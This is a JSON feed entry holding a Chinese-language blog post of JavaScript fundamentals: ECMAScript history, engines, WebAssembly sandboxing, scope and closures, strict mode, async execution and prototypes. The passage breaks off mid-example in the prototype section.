{
    "version": "https://jsonfeed.org/version/1",
    "title": "Khala • All posts by \"沙箱\" tag",
    "description": "GLHF",
    "home_page_url": "https://mobius-0.github.io",
    "items": [
        {
            "id": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/JavaScript/",
            "url": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/JavaScript/",
            "title": "JavaScript",
            "date_published": "2022-11-28T01:50:11.000Z",
            "content_html": "<h1 id=\"ecmascript\"><a class=\"anchor\" href=\"#ecmascript\">#</a> ECMAScript</h1>\n<h2 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h2>\n<p>ECMAScript 是一种由 ECMA 国际通过 ECMA-262 标准化的脚本程序设计语言，它往往被称为 JavaScript 或 JScript。简单的，可以认为 ECMAScript 是 JavaScript 的一个标准，但实际上后两者是 ECMA-262 标准的实现和扩展。</p>\n<h2 id=\"版本\"><a class=\"anchor\" href=\"#版本\">#</a> 版本</h2>\n<p>1997 年 6 月，首版发布。1998 年 6 月，进行了格式修正，以使得其形式与 ISO/IEC16262 国际标准一致。1999 年 12 月，引入强大的正则表达式，更好的词法作用域链处理，新的控制指令，异常处理，错误定义更加明确，数据输出的格式化及其它改变。而后由于关于语言的复杂性出现分歧，第 4 版本被放弃，其中的部分成为了第 5 版本及 Harmony 的基础。</p>\n<p>2009 年 12 月，第五版发布，新增 “严格模式（strict mode）”，澄清了许多第 3 版本的模糊规范，并适应了与规范不一致的真实世界实现的行为。增加了部分新功能，如 getters 及 setters，支持 JSON 以及在对象属性上更完整的反射。</p>\n<p>2015 年 6 月，第 6 版发布，最早被称作是 ECMAScript 6（ES6），添加了类和模块的语法，迭代器，Python 风格的生成器和生成器表达式，箭头函数，二进制数据，静态类型数组，集合（maps，sets 和 weak maps），promise，reflection 和 proxies。</p>\n<p>2016 年 6 月，ECMAScript 2016（ES2016）发布，引入  <code>Array.prototype.includes</code>  、指数运算符、SIMD 等新特性。</p>\n<p>2017 年 6 月，ECMAScript 2017（ES2017）发布，多个新的概念和语言特性。</p>\n<p>2018 年 6 月，ECMAScript 2018 （ES2018）发布包含了异步循环，生成器，新的正则表达式特性和 rest/spread 语法。</p>\n<h2 id=\"es6-特性\"><a class=\"anchor\" href=\"#es6-特性\">#</a> ES6 特性</h2>\n<ul>\n<li><code>const</code>  /  <code>let</code></li>\n<li>模板字面量</li>\n<li>解构\n<ul>\n<li><code>[a, b] = [10, 20]</code></li>\n</ul>\n</li>\n<li>对象字面量简写法</li>\n<li><code>for...of</code>  循环</li>\n<li><code>...xxx</code>  展开运算符</li>\n<li>可变参数</li>\n<li>箭头函数</li>\n<li>默认参数函数</li>\n<li>默认值与解构</li>\n<li>类</li>\n</ul>\n<h1 id=\"引擎\"><a class=\"anchor\" href=\"#引擎\">#</a> 引擎</h1>\n<h2 id=\"v8\"><a class=\"anchor\" href=\"#v8\">#</a> V8</h2>\n<p>V8 是 Chrome 的 JavaScript 语言处理程序（VM）。其引擎由 TurboFan、Ignition 和 Liftoff 组成。其中 Turbofan 是其优化编译器，Ignition 则是其解释器，Liftoff 是 WebAssembly 的代码生成器。</p>\n<h2 id=\"spidermonkey\"><a class=\"anchor\" href=\"#spidermonkey\">#</a> SpiderMonkey</h2>\n<p>SpiderMonkey 是 Mozilla 项目的一部分，是一个用 C/C++ 实现的 JavaScript 脚本引擎。</p>\n<h2 id=\"javascriptcore\"><a class=\"anchor\" href=\"#javascriptcore\">#</a> JavaScriptCore</h2>\n<p>JavaScriptCore 的优化执行分为四个部分，LLInt、Baseline、DFG、FTL。LLInt 是最开始的解释执行部分，Baseline 是暂时的 JIT，DFG 阶段开始做一定的优化，FTL 阶段做了充分的优化。</p>\n<h2 id=\"chakracore\"><a class=\"anchor\" href=\"#chakracore\">#</a> ChakraCore</h2>\n<p>ChakraCore 是一个完整的 JavaScript 虚拟机，由微软实现，用于 Edge 浏览器以及 IE 的后期版本中。</p>\n<h2 id=\"jscript\"><a class=\"anchor\" href=\"#jscript\">#</a> JScript</h2>\n<p>JScript 是由微软开发的脚本语言，是微软对 ECMAScript 规范的实现，用于 IE 的早期版本中。</p>\n<h2 id=\"jerryscript\"><a class=\"anchor\" href=\"#jerryscript\">#</a> JerryScript</h2>\n<p>JerryScript 是一个适用于嵌入式设备的小型 JavaScript 引擎，由三星开发并维护。</p>\n<h1 id=\"webassembly\"><a class=\"anchor\" href=\"#webassembly\">#</a> WebAssembly</h1>\n<h2 id=\"简介-2\"><a class=\"anchor\" href=\"#简介-2\">#</a> 简介</h2>\n<p>简而言之，WASM 是一种分发要在浏览器中执行的代码的新方法。它是一种二进制语言，但是无法直接在处理器上运行。在运行时，代码被编译为中间字节代码，可以在浏览器内快速转换为机器代码，然后比传统 JavaScript 更有效地执行。</p>\n<h2 id=\"执行\"><a class=\"anchor\" href=\"#执行\">#</a> 执行</h2>\n<p>虽然浏览器可能以不同的方式来实现 Wasm 支持，但是使用的沙盒环境通常是 JavaScript 沙箱。</p>\n<p>在浏览器中运行时，Wasm 应用程序需要将其代码定义为单独的文件或 JavaScript 块内的字节数组。 然后使用 JavaScript 实例化文件或代码块，目前不能在没有 JavaScript 包装器的情况下直接在页面中调用 Wasm。</p>\n<p>虽然 Wasm 可以用 C / C++ 等语言编写，但它本身不能与沙箱之外的环境进行交互。这意味着当 Wasm 应用程序想要进行输出文本等操作时，它需要调用浏览器提供的功能，然后使用浏览器在某处输出文本。</p>\n<p>Wasm 中的内存是线性的，它在 Wasm 应用程序和 JavaScript 之间共享。 当 Wasm 函数将字符串返回给 JavaScript 时，它实际上返回一个指向 Wasm 应用程序内存空间内位置的指针。 Wasm 应用程序本身只能访问分配给它的 JavaScript 内存部分，而不是整个内存空间。</p>\n<h2 id=\"安全\"><a class=\"anchor\" href=\"#安全\">#</a> 安全</h2>\n<p>Wasm 的设计从如下几个方面考虑来保证 Wasm 的安全性</p>\n<ul>\n<li>保护用户免受由于无意的错误而导致漏洞的应用程序的侵害</li>\n<li>保护用户免受故意编写为恶意的应用程序的侵害</li>\n<li>为开发人员提供良好的缓解措施</li>\n</ul>\n<p>具体的安全措施有</p>\n<ul>\n<li>Wasm 应用程序在沙箱内运行</li>\n<li>Wasm 无法对任意地址进行函数调用。Wasm 采用对函数进行编号的方式，编号存储在函数表中</li>\n<li>间接函数调用受类型签名检查的约束</li>\n<li>调用堆栈受到保护，这意味着无法覆盖返回指针</li>\n<li>实现了控制流完整性，这意味着调用意外的函数将失败</li>\n</ul>\n<h1 id=\"作用域与闭包\"><a class=\"anchor\" href=\"#作用域与闭包\">#</a> 作用域与闭包</h1>\n<h2 id=\"作用域与作用域链\"><a class=\"anchor\" href=\"#作用域与作用域链\">#</a> 作用域与作用域链</h2>\n<h3 id=\"作用域\"><a class=\"anchor\" href=\"#作用域\">#</a> 作用域</h3>\n<p>简单来说，作用域就是变量与函数的可访问范围，即作用域控制着变量与函数的可见性和生命周期。JavaScript 的作用域是靠函数来形成的，也就是说一个函数的变量在函数外不可以访问。</p>\n<p>作用域可以分为全局作用域、局部作用域和块级作用域，其中全局作用域主要有以下三种情况：</p>\n<ul>\n<li>函数外面定义的变量拥有全局作用域</li>\n<li>未定义直接赋值的变量自动声明为拥有全局作用域</li>\n<li>window 对象的属性拥有全局作用</li>\n</ul>\n<p>局部作用域一般只在固定的代码片段内可访问到，最常见的例如函数内部，所以也会把这种作用域称为函数作用域。</p>\n<h3 id=\"作用域泄漏\"><a class=\"anchor\" href=\"#作用域泄漏\">#</a> 作用域泄漏</h3>\n<p>在 ES5 标准时，只有全局作用域和局部作用域，没有块级作用域，这样可能会造成变量泄漏的问题。例如：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// undefined</span></pre></td></tr></table></figure><h3 id=\"作用域提升var-hoisting\"><a class=\"anchor\" href=\"#作用域提升var-hoisting\">#</a> 作用域提升（var Hoisting）</h3>\n<p>在 JavaScript 中，使用 var 在函数或全局内任何地方声明变量相当于在其内部最顶上声明它，这种行为称为 Hoisting。例如下面这段代码等效于第二段代码</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">foo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// => undefined</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">var</span> x <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// => 1</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">foo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">foo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">var</span> x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// => undefined</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    x <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// => 1</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">foo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"作用域链\"><a class=\"anchor\" href=\"#作用域链\">#</a> 作用域链</h3>\n<p>当函数被执行时，总是先从函数内部找寻局部变量，如果找不到相应的变量，则会向创建函数的上级作用域寻找，直到找到全局作用域为止，这个过程被称为作用域链。</p>\n<h2 id=\"闭包\"><a class=\"anchor\" href=\"#闭包\">#</a> 闭包</h2>\n<p>函数与对其状态即词法环境（lexical environment）的引用共同构成闭包（closure）。也就是说，闭包可以让你从内部函数访问外部函数作用域。在 JavaScript，函数在每次创建时生成闭包。</p>\n<p>在 JavaScript 中，并没有原生的对 private 方法的支持，即一个元素 / 方法只能被同一个类中的其它方法所调用。而闭包则是一种可以被用于模拟私有方法的方案。另外闭包也提供了管理全局命名空间的能力，避免非核心的方法或属性污染了代码的公共接口部分。下面是一个简单的例子：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> Counter <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">var</span> privateCounter <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">function</span> <span class=\"token function\">changeBy</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">val</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    privateCounter <span class=\"token operator\">+=</span> val<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function-variable function\">increment</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>      <span class=\"token function\">changeBy</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function-variable function\">decrement</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token function\">changeBy</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function-variable function\">value</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token keyword\">return</span> privateCounter<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>Counter<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* logs 0 */</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Counter<span class=\"token punctuation\">.</span><span class=\"token function\">increment</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>Counter<span class=\"token punctuation\">.</span><span class=\"token function\">increment</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>Counter<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* logs 2 */</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>Counter<span class=\"token punctuation\">.</span><span class=\"token function\">decrement</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>Counter<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* logs 1 */</span></pre></td></tr></table></figure><h2 id=\"全局对象\"><a class=\"anchor\" href=\"#全局对象\">#</a> 全局对象</h2>\n<p>全局对象是一个特殊的对象，它的作用域是全局的。</p>\n<p>全平台可用的全局对象是  <code>globalThis</code>  ，它跟全局作用域里的 this 值相同。另外在浏览器中存在  <code>self</code>  和  <code>window</code>  全局对象，Web Workers 中存在  <code>self</code>  全局对象，Node.js 中存在  <code>global</code>  全局对象。</p>\n<h1 id=\"严格模式\"><a class=\"anchor\" href=\"#严格模式\">#</a> 严格模式</h1>\n<h2 id=\"简介-3\"><a class=\"anchor\" href=\"#简介-3\">#</a> 简介</h2>\n<p>在 ES5 中，除了正常的运行模式之外，添加了严格模式（strict mode），这种模式使得代码显式地脱离 “马虎模式 / 稀松模式 / 懒散模式 “（sloppy）模式在更严格的条件下运行。严格模式不仅仅是一个子集：它的产生是为了形成与正常代码不同的语义。</p>\n<p>引入严格模式的目的主要是：</p>\n<ul>\n<li>通过抛出错误来消除了一些原有静默错误</li>\n<li>消除 JavaScript 语法的一些不合理、不严谨之处，减少一些怪异行为</li>\n<li>消除代码运行的一些不安全之处，保证代码运行的安全</li>\n<li>修复了一些导致 JavaScript 引擎难以执行优化的缺陷，提高编译器效率，增加运行速度</li>\n<li>禁用了在 ECMAScript 的未来版本中可能会定义的一些语法，为未来新版本的 JavaScript 做铺垫</li>\n</ul>\n<h2 id=\"调用\"><a class=\"anchor\" href=\"#调用\">#</a> 调用</h2>\n<p>严格模式使用  <code>&quot;use strict&quot;;</code>  字符串开启。对整个脚本文件而言，可以将  <code>&quot;use strict&quot;</code>  放在脚本文件的第一行使整个脚本以严格模式运行。如果这行语句不在第一行则不会生效，会以正常模式运行。</p>\n<p>对单个函数而言，将  <code>&quot;use strict&quot;</code>  放在函数体的第一行，则整个函数以严格模式运行。</p>\n<h2 id=\"行为改变\"><a class=\"anchor\" href=\"#行为改变\">#</a> 行为改变</h2>\n<p>在严格模式中，主要有以下的行为更改：</p>\n<h3 id=\"全局变量显式声明\"><a class=\"anchor\" href=\"#全局变量显式声明\">#</a> 全局变量显式声明</h3>\n<p>在正常模式中，如果一个变量没有声明就赋值，默认是全局变量。严格模式禁止这种用法，全局变量必须显式声明。</p>\n<pre><code class=\"language-JavaScript\">&quot;use strict&quot;;\nfor(i = 0; i &lt; 2; i++) &#123; // ReferenceError: i is not defined\n&#125;\n</code></pre>\n<h3 id=\"禁止使用with语句\"><a class=\"anchor\" href=\"#禁止使用with语句\">#</a> 禁止使用 with 语句</h3>\n<p>with 语句无法在编译时就确定，属性到底归属哪个对象，这会影响编译效率，所以在严格模式中被禁止。</p>\n<h3 id=\"创设eval作用域\"><a class=\"anchor\" href=\"#创设eval作用域\">#</a> 创设 eval 作用域</h3>\n<p>正常模式下，eval 语句的作用域，取决于它处于全局作用域，还是处于函数作用域。严格模式下，eval 语句本身就是一个作用域，不再能够生成全局变量了，它所生成的变量只能用于 eval 内部。</p>\n<h3 id=\"禁止删除变量\"><a class=\"anchor\" href=\"#禁止删除变量\">#</a> 禁止删除变量</h3>\n<p>严格模式下无法删除变量。只有 configurable 设置为 true 的对象属性，才能被删除。</p>\n<h3 id=\"显式报错\"><a class=\"anchor\" href=\"#显式报错\">#</a> 显式报错</h3>\n<p>正常模式下一些错误只会默默地失败，但是严格模式下将会报错，包括以下几种场景：</p>\n<ul>\n<li>对一个对象的只读属性进行赋值</li>\n<li>对一个使用 getter 方法读取的属性进行赋值</li>\n<li>对禁止扩展的对象添加新属性</li>\n<li>删除一个不可删除的属性</li>\n</ul>\n<h3 id=\"语法错误\"><a class=\"anchor\" href=\"#语法错误\">#</a> 语法错误</h3>\n<p>严格模式新增了一些语法错误，包括：</p>\n<ul>\n<li>对象不能有重名的属性</li>\n<li>函数不能有重名的参数</li>\n<li>禁止八进制表示法</li>\n<li>函数必须声明在顶层</li>\n<li>新增保留字\n<ul>\n<li>class</li>\n<li>enum</li>\n<li>export</li>\n<li>extends</li>\n<li>import</li>\n<li>super</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"安全增强\"><a class=\"anchor\" href=\"#安全增强\">#</a> 安全增强</h3>\n<ul>\n<li>禁止 this 关键字指向全局对象</li>\n<li>禁止在函数内部遍历调用栈</li>\n</ul>\n<h3 id=\"限制arguments对象\"><a class=\"anchor\" href=\"#限制arguments对象\">#</a> 限制 arguments 对象</h3>\n<ul>\n<li>不允许对 arguments 赋值</li>\n<li>arguments 不再追踪参数的变化</li>\n<li>禁止使用 arguments.callee</li>\n</ul>\n<h1 id=\"异步机制\"><a class=\"anchor\" href=\"#异步机制\">#</a> 异步机制</h1>\n<h2 id=\"async-await\"><a class=\"anchor\" href=\"#async-await\">#</a> async / await</h2>\n<p>async function 关键字用来在表达式中定义异步函数。</p>\n<h2 id=\"promise\"><a class=\"anchor\" href=\"#promise\">#</a> Promise</h2>\n<p>Promise 对象是一个代理对象（代理一个值），被代理的值在 Promise 对象创建时可能是未知的。它允许你为异步操作的成功和失败分别绑定相应的处理方法（handlers）。 这让异步方法可以像同步方法那样返回值，但并不是立即返回最终执行结果，而是一个能代表未来出现的结果的 promise 对象</p>\n<p>一个 Promise 有以下几种状态:</p>\n<ul>\n<li>pending: 初始状态，既不是成功，也不是失败状态。</li>\n<li>fulfilled: 意味着操作成功完成。</li>\n<li>rejected: 意味着操作失败。</li>\n</ul>\n<p>pending 状态的 Promise 对象可能会变为 fulfilled 状态并传递一个值给相应的状态处理方法，也可能变为失败状态（rejected）并传递失败信息。当其中任一种情况出现时，Promise 对象的 then 方法绑定的处理方法（handlers ）就会被调用（then 方法包含两个参数：onfulfilled 和 onrejected，它们都是 Function 类型。当 Promise 状态为 fulfilled 时，调用 then 的 onfulfilled 方法，当 Promise 状态为 rejected 时，调用 then 的 onrejected 方法， 所以在异步操作的完成和绑定处理方法之间不存在竞争）。</p>\n<p>因为 Promise.prototype.then 和 Promise.prototype.catch 方法返回 promise 对象， 所以它们可以被链式调用。</p>\n<h2 id=\"执行队列\"><a class=\"anchor\" href=\"#执行队列\">#</a> 执行队列</h2>\n<p>JavaScript 中的异步运行机制如下：</p>\n<ul>\n<li>所有同步任务都在主线程上执行，形成一个执行栈</li>\n<li>主线程之外，还存在一个任务队列。只要异步任务有了运行结果，就在任务队列之中放置一个事件。</li>\n<li>一旦执行栈中的所有同步任务执行完毕，系统就会读取任务队列，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。</li>\n<li>主线程不断重复上面的第三步。</li>\n</ul>\n<p>其中浏览器的内核是多线程的，在浏览器的内核中不同的异步操作由不同的浏览器内核模块调度执行，异步操作会将相关回调添加到任务队列中。可以分为 DOM 事件、时间回调、网络回调三种：</p>\n<ul>\n<li>DOM 事件：由浏览器内核的 DOM 模块来处理，当事件触发的时候，回调函数会被添加到任务队列中。</li>\n<li>时间回调：setTimeout /setInterval 等函数会由浏览器内核的 timer 模块来进行延时处理，当时间到达的时候，将回调函数添加到任务队列中。</li>\n<li>网络回调：ajax /fetch 等则由浏览器内核的 network 模块来处理，在网络请求完成返回之后，才将回调添加到任务队列中。</li>\n</ul>\n<h1 id=\"原型链\"><a class=\"anchor\" href=\"#原型链\">#</a> 原型链</h1>\n<h2 id=\"显式原型和隐式原型\"><a class=\"anchor\" href=\"#显式原型和隐式原型\">#</a> 显式原型和隐式原型</h2>\n<p>JavaScript 的原型分为显式原型（explicit prototype property）和隐式原型（implicit prototype link）。</p>\n<p>其中显式原型指 prototype，是函数的一个属性，这个属性是一个指针，指向一个对象，显示修改对象的原型的属性，只有函数才有该属性</p>\n<p>隐式原型指 JavaScript 中任意对象都有的内置属性 prototype。在 ES5 之前没有标准的方法访问这个内置属性，但是大多数浏览器都支持通过  <code>__proto__</code>  来访问。ES5 中有了对于这个内置属性标准的 Get 方法  <code>Object.getPrototypeOf()</code>  。</p>\n<p>隐式原型指向创建这个对象的函数 (constructor) 的 prototype，  <code>__proto__</code>  指向的是当前对象的原型对象，而 prototype 指向的，是以当前函数作为构造函数构造出来的对象的原型对象。</p>\n<p>显式原型的作用用来实现基于原型的继承与属性的共享。 隐式原型的用于构成原型链，同样用于实现基于原型的继承。举个例子，当我们访问 obj 这个对象中的 x 属性时，如果在 obj 中找不到，那么就会沿着  <code>__proto__</code>  依次查找。</p>\n<pre><code>Note: Object.prototype 这个对象是个例外，它的__proto__值为null\n</code></pre>\n<h2 id=\"new-的过程\"><a class=\"anchor\" href=\"#new-的过程\">#</a> new 的过程</h2>\n<pre><code class=\"language-JavaScript\">var Person = function()&#123;&#125;;\nvar p = new Person();\n</code></pre>\n<p>new 的过程拆分成以下三步： -  <code>var p=&#123;&#125;;</code>  初始化一个对象 p -  <code>p.__proto__ = Person.prototype;</code>  -  <code>Person.call(p);</code>  构造 p，也可以称之为初始化 p</p>\n<p>关键在于第二步，我们来证明一下：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> <span class=\"token function-variable function\">Person</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">var</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>__proto__ <span class=\"token operator\">===</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这段代码会返回 true。说明我们步骤 2 是正确的。</p>\n<h2 id=\"示例\"><a class=\"anchor\" href=\"#示例\">#</a> 示例</h2>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> <span class=\"token function-variable function\">Person</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">Person</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">sayName</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"My Name is Jacky\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token class-name\">Person</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> <span class=\"token number\">27</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">var</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span 